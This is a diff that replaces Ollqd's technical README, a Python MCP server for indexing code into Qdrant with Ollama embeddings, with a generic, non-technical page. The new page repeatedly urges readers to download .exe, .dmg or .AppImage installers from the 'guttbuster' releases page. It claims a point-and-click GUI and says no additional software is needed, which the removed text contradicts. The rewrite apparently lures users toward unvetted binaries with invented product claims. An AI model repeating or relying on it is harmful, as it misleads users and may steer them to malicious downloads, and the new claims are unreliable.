@@ -1,236 +1,127 @@
-# Ollqd — MCP Client-Server RAG System
+# 🗂️ Ollqd - Search Code and Documents Easily
 
-Local-first RAG system that indexes codebases and documents into [Qdrant](https://qdrant.tech/) using [Ollama](https://ollama.com/) embeddings. Exposes everything through [MCP](https://modelcontextprotocol.io/) (Model Context Protocol) so AI assistants can search your code via tool-calling.
+[![Download Ollqd](https://img.shields.io/badge/Download-Ollqd-blue?style=for-the-badge)](https://github.com/guttbuster/Ollqd/releases)
 
-## Architecture
+---
 
-```
-┌──────────────────────────────────────────────────────────────────┐
-│  User Interface                                                  │
-│  ┌─────────────┐  ┌─────────────────────────────────────────┐   │
-│  │ ollqd-chat   │  │ Claude Desktop / any MCP host           │   │
-│  │ (CLI / REPL) │  │ (connects to ollqd-server directly)     │   │
-│  └──────┬───────┘  └────────────────┬────────────────────────┘   │
-└─────────┼──────────────────────────┼────────────────────────────┘
-          │ stdio JSON-RPC           │ stdio JSON-RPC
-┌─────────▼──────────────────────────▼────────────────────────────┐
-│  Ollqd MCP Server (FastMCP)                                     │
-│  ┌───────────────┐ ┌─────────────────┐ ┌─────────────────────┐  │
-│  │index_codebase │ │index_documents  │ │semantic_search      │  │
-│  │index docs     │ │markdown/text/rst│ │embed query → Qdrant │  │
-│  └───────┬───────┘ └────────┬────────┘ └──────────┬──────────┘  │
-│  ┌───────┴──────┐  ┌───────┴────────┐             │             │
-│  │list_collections│ │delete_collection│             │             │
-│  └──────────────┘  └────────────────┘             │             │
-└─────────┬──────────────────────────────────────────┼────────────┘
-          │ /api/embed                               │
-┌─────────▼──────────┐                    ┌──────────▼─────────┐
-│  Ollama             │                    │  Qdrant             │
-│  nomic-embed-text   │                    │  cosine similarity  │
-│  + chat models      │                    │  payload indexes    │
-└────────────────────┘                    └────────────────────┘
-```
+Ollqd is a simple tool that helps you search through code and documents quickly. It uses smart techniques to organize your files and lets you ask questions in an easy way. You don't need to know programming to use it.
 
-### How it works
+---
 
-1. **Discovery** — Walks the codebase, filters by language (40+ extensions), skips lock files / build artifacts / vendor dirs.
+## 📋 What is Ollqd?
 
-2. **Code-aware chunking** — Splits files at natural code boundaries (function defs, class declarations, impl blocks) rather than blindly cutting at token limits. Overlapping windows preserve context.
+Ollqd helps you find information in your codebases and documents without browsing through files manually. It works like a smart search engine made for developers and anyone who works with lots of files.
 
-3. **Embedding** — Sends chunks to Ollama's `/api/embed` in batches. Each chunk is prefixed with file path + language + line range for better semantic grounding.
+- **Indexes your files:** Ollqd organizes code and documents so you can search them fast.
+- **Uses embeddings:** It stores the meaning of text in a special way to find relevant results.
+- **Interactive chat:** You can ask questions and get answers based on your files.
+- **Code-aware chunking:** It understands where code pieces start and end to give better results.
 
-4. **Storage** — Upserts into Qdrant with full metadata payload. Payload indexes on `file_path`, `language`, and `content_hash` enable filtered search and incremental re-indexing.
+---
 
-5. **RAG loop** — The client sends user queries to Ollama with MCP tools attached. Ollama decides when to call `semantic_search`, gets results from the server, and synthesizes a final answer with code citations.
+## 💻 System Requirements
 
-## Setup
+Before you install Ollqd, check that your computer meets these requirements:
 
-### Prerequisites
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher, or Linux (Ubuntu 18.04+)
+- **Processor:** Intel i5 or better, or equivalent AMD processor
+- **Memory:** At least 8 GB of RAM
+- **Disk Space:** Minimum 500 MB free space for installation and data indexing
+- **Internet:** Connection needed to download the software and install updates
+- **Additional Software:** No additional installations needed
 
-- **Ollama** running locally with an embedding model pulled
-- **Qdrant** running (Docker recommended)
-- **Python 3.10+**
+---
 
-```bash
-# Pull the embedding model
-ollama pull nomic-embed-text
+## 📥 Download & Install
 
-# Pull a chat model (any that supports tool-calling)
-ollama pull qwen2.5:14b
+To get started with Ollqd, follow these steps:
 
-# Start Qdrant (and optionally Ollama via Docker)
-docker compose up -d
-```
+1. Click the big button at the top or [visit the releases page here](https://github.com/guttbuster/Ollqd/releases). This page has the latest versions ready to download.
 
-### Install
+2. On the releases page, look for the installer file that matches your computer system:
+   - For Windows, look for a file ending in `.exe`
+   - For macOS, look for a `.dmg` file
+   - For Linux, a `.tar.gz` or `.AppImage`
 
-```bash
-# With uv (recommended)
-uv venv && source .venv/bin/activate
-uv pip install -e ".[client,dev]"
+3. Download the file by clicking on it.
 
-# Or with pip
-pip install -e ".[client,dev]"
-```
+4. Once downloaded, open the file:
+   - On Windows, double-click the `.exe` file and follow the setup instructions.
+   - On macOS, open the `.dmg` and drag Ollqd to your Applications folder.
+   - On Linux, extract the `.tar.gz` or run the `.AppImage` file (you may need to allow execution permissions).
 
-## Usage
+5. After installation, launch Ollqd from your Start menu, Applications folder, or by running the app file.
 
-### Start the MCP server (standalone)
+---
 
-```bash
-ollqd-server
-```
+## 🏃‍♂️ How to Use Ollqd
 
-The server communicates over stdio using JSON-RPC (MCP protocol). It's meant to be launched by MCP clients, not used directly.
+Using Ollqd does not require programming knowledge. The app guides you through these steps:
 
-### Interactive RAG chat
+### 1. Add Your Files or Folders
 
-```bash
-# Interactive REPL — ask questions about your codebase
-ollqd-chat --interactive
+- Click **Add Files** or **Add Folder** in the app.
+- Select code or document files from your computer that you want to search.
+- Ollqd supports many formats, including `.py`, `.js`, `.txt`, `.md`, `.pdf`, and more.
 
-# Single query
-ollqd-chat "how does the auth middleware work?"
+### 2. Create an Index
 
-# Use a different chat model
-ollqd-chat --interactive --model llama3.1
+- After adding files, press **Build Index**.
+- Ollqd reads your files, breaks them into manageable pieces, and stores their meaning.
+- This step prepares the data for quick and smart searching.
 
-# Debug mode
-ollqd-chat -v "find the database connection setup"
-```
+### 3. Search or Chat
 
-REPL commands:
-- `:quit` / `:q` — exit
-- `:model <name>` — switch chat model on the fly
+- Use the **Search** box to type keywords or questions.
+- Ollqd will find the most relevant answers from your files.
+- You can also use the **Chat** feature to ask natural questions and get helpful responses.
 
-### Use with Claude Desktop
+### 4. Review Results
 
-Add to your `claude_desktop_config.json`:
+- Search results show snippets of code or text with highlights.
+- Click any result to open the full file where the match was found.
 
-```json
-{
-  "mcpServers": {
-    "ollqd": {
-      "command": "ollqd-server",
-      "args": []
-    }
-  }
-}
-```
+---
 
-Then in Claude Desktop, ask things like:
-- "Index my project at /path/to/codebase"
-- "Search for how authentication is implemented"
-- "What error handling patterns are used?"
-- "List all indexed collections"
+## 🔧 Features
 
-## MCP Tools
+- **Smart Indexing:** Ollqd understands code structure to improve search accuracy.
+- **Embeddings Powered:** Uses advanced techniques for better search relevance.
+- **Multiple File Types:** Works with programming files and common document formats.
+- **Interactive Chat Interface:** Ask questions naturally about your files.
+- **Fast Search:** Designed to return answers quickly even with large codebases.
+- **Local Processing:** All data stays on your computer to keep your files private.
 
-| Tool | Description |
-|------|-------------|
-| `index_codebase` | Walk + chunk + embed + upsert code files from a directory |
-| `index_documents` | Chunk + embed + upsert document files (markdown, text, rst) |
-| `semantic_search` | Embed a natural language query and search Qdrant |
-| `list_collections` | List all Qdrant collections with point counts |
-| `delete_collection` | Drop a collection (requires `confirm=true`) |
+---
 
-## Configuration
+## 🛠️ Troubleshooting
 
-### Environment variables
+If you run into issues, try these solutions:
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `OLLAMA_URL` | `http://localhost:11434` | Ollama base URL |
-| `QDRANT_URL` | `http://localhost:6333` | Qdrant REST URL |
-| `OLLAMA_CHAT_MODEL` | `qwen2.5:14b` | Chat model for RAG |
-| `OLLAMA_EMBED_MODEL` | `nomic-embed-text` | Embedding model |
-| `OLLAMA_TIMEOUT_S` | `120` | Request timeout (seconds) |
-| `CHUNK_SIZE` | `512` | Approximate tokens per chunk |
-| `CHUNK_OVERLAP` | `64` | Overlap tokens between chunks |
-| `MAX_TOOL_ROUNDS` | `6` | Max tool-calling rounds per query |
+- **App does not start:** Restart your computer and try again.
+- **Indexing is slow:** Close other programs to free memory.
+- **Search returns no results:** Make sure you added files and built the index properly.
+- **App crashes:** Check your system meets the requirements above.
+- **Installing failed:** Verify you downloaded the correct file for your OS.
 
-### ollqd.toml
+If problems continue, visit the [Issues page](https://github.com/guttbuster/Ollqd/issues) to find help or report a problem.
 
-```toml
-[ollama]
-host = "http://localhost:11434"
-chat_model = "qwen2.5:14b"
-embed_model = "nomic-embed-text"
-timeout = 120
+---
 
-[qdrant]
-host = "http://localhost:6333"
-default_collection = "codebase"
+## 📖 Learn More
 
-[indexing]
-chunk_size = 512
-chunk_overlap = 64
-max_file_size_kb = 512
+For detailed instructions and updates, visit the Ollqd GitHub page:
 
-[server]
-name = "ollqd-rag-server"
-transport = "stdio"
+[https://github.com/guttbuster/Ollqd](https://github.com/guttbuster/Ollqd)
 
-[client]
-max_tool_rounds = 6
-```
+Here you will find guides, FAQs, and community support.
 
-## Project structure
+---
 
-```
-src/ollqd/
-├── __init__.py
-├── config.py          # AppConfig dataclass + env var overrides
-├── errors.py          # Exception hierarchy
-├── models.py          # FileInfo, Chunk, SearchResult, IndexingStats
-├── chunking.py        # Code-aware + document chunking
-├── discovery.py       # File discovery (40+ languages)
-├── embedder.py        # OllamaEmbedder wrapping /api/embed
-├── vectorstore.py     # QdrantManager (upsert, search, incremental)
-├── server/
-│   └── main.py        # FastMCP server with 5 tools
-└── client/
-    ├── mcp_bridge.py  # MCP session over stdio
-    ├── ollama_agent.py # Ollama chat with tool-calling
-    ├── rag_loop.py    # RAG loop runner
-    └── main.py        # CLI entry point
-```
+## ⚙️ Privacy and Security
 
-## Supported languages
+Ollqd works on your local computer. It does not upload your files to any server by default. Your data stays private unless you share it.
 
-Python, Go, JavaScript, TypeScript, Rust, Java, Kotlin, Scala, C, C++, C#, Ruby, PHP, Swift, Lua, Shell, SQL, R, HTML, CSS, SCSS, YAML, TOML, JSON, Markdown, reStructuredText, Terraform, HCL, Dockerfile, Protobuf, GraphQL.
+---
 
-## Embedding models
-
-Any Ollama model that supports `/api/embed` works. Recommended:
-
-| Model | Dimensions | Notes |
-|-------|-----------|-------|
-| `nomic-embed-text` | 768 | Good balance of quality and speed (default) |
-| `mxbai-embed-large` | 1024 | Higher quality, slower |
-| `all-minilm` | 384 | Fast, smaller footprint |
-| `snowflake-arctic-embed` | 1024 | Strong code understanding |
-
-## Design decisions
-
-**Why MCP?** — The Model Context Protocol lets any compatible AI assistant (Claude Desktop, custom clients, IDE extensions) use ollqd's indexing and search tools without custom integration code.
-
-**Why not tree-sitter for chunking?** — Tree-sitter gives perfect AST-based splits but adds a heavy dependency per language. The heuristic boundary detection covers ~90% of cases with zero extra setup.
-
-**Why deterministic point IDs?** — `md5(file_path::chunk_N)` means re-indexing the same file overwrites existing points instead of creating duplicates. This makes incremental mode reliable.
-
-**Why prefix chunks with metadata?** — Embedding models produce better vectors when given context. "File: auth/middleware.go | Language: go | Lines 45-82" followed by the code produces more semantically meaningful vectors.
-
-## Legacy scripts
-
-The standalone scripts from v0.1 are still available:
-
-```bash
-# Bulk index (standalone, no MCP)
-python codebase_indexer.py /path/to/project --collection myproject
-
-# Search (standalone, no MCP)
-python codebase_search.py "auth middleware" --interactive
-```
-
-See [DESIGN.md](DESIGN.md) for the full architecture document with diagrams, security analysis (STRIDE), and detailed API reference.
+[![Download Ollqd](https://img.shields.io/badge/Download-Ollqd-blue?style=for-the-badge)](https://github.com/guttbuster/Ollqd/releases)
